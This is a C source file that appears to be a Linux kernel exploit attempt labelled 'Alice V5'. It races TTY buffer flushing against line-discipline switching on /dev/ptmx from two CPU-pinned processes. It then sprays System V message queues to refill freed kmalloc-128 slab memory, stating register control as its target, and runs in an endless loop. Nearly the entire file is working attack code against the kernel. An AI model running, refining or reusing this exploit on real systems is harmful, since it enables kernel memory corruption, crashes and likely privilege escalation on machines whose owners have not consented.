#define _GNU_SOURCE
#include <stdint.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/uio.h>
#include <sys/msg.h>
#include <sched.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <time.h>
#include <string.h>

#define TRAIN_SIZE 1024
#define SPRAY_COUNT 512

// This is the "Carrot" that fills the kmalloc-128 slab
struct alice_msg {
    long mtype;
    uint64_t data[16]; 
};

void pin_to_cpu(int cpu) {
    cpu_set_t mask;
    CPU_ZERO(&mask);
    CPU_SET(cpu, &mask);
    sched_setaffinity(0, sizeof(mask), &mask);
}

// System V Message Spray - Targets the "holes" left by freed TTY buffers
void rabbit_hole_spray() {
    struct alice_msg msg;
    msg.mtype = 1;
    for (int i = 0; i < 16; i++) {
        msg.data[i] = 0x4242424242424242; 
    }

    for (int i = 0; i < SPRAY_COUNT; i++) {
        int msgid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
        if (msgid == -1) break;
        if (msgsnd(msgid, &msg, sizeof(msg.data), IPC_NOWAIT) == -1) {
            // If queue is full, just stop
            break; 
        }
    }
}

void hammer_v5(int fd) {
    uint8_t dummy_buf[1024];
    memset(dummy_buf, 0, sizeof(dummy_buf));
    struct iovec iov = {dummy_buf, sizeof(dummy_buf)};
    
    int ldisc_tty = 0;   // N_TTY
    int ldisc_slip = 2;  // N_SLIP
    int flush = 0x2;     // TCIOFLUSH

    for (int i = 0; i < TRAIN_SIZE; i++) {
        // 1. Saturate the buffer
        syscall(20, (long)fd, &iov, 1); // writev
        
        // 2. Trigger the race: Flush vs Switch
        ioctl(fd, 0x540b, flush);
        ioctl(fd, 0x5423, (i % 2) ? &ldisc_tty : &ldisc_slip);
        
        // 3. Jitter to let the kernel threads desync
        if (i % 20 == 0) {
            struct timespec ts = {0, 500}; 
            nanosleep(&ts, NULL);
        }
    }
}

int main() {
    printf("[*] Alice V5: CPU-Pinned Race + Message Queue Spray\n");
    printf("[*] Target: Triggering CR2/RAX control over the White Rabbit\n");

    while (1) {
        int fd = open("/dev/ptmx", O_RDWR | O_NOCTTY);
        if (fd < 0) continue;

        if (fork() == 0) {
            pin_to_cpu(1); // Force Race Part A to Core 1
            hammer_v5(fd);
            exit(0);
        }
        
        pin_to_cpu(0);     // Force Race Part B to Core 0
        hammer_v5(fd);
        
        // The Critical Step: Spray the heap immediately as we close
        // This is where Alice fills the Rabbit's hole.
        rabbit_hole_spray();

        close(fd);
        
        // Short pause to avoid hitting Cgroup PID limits too fast
        usleep(1000); 
    }
    return 0;
}
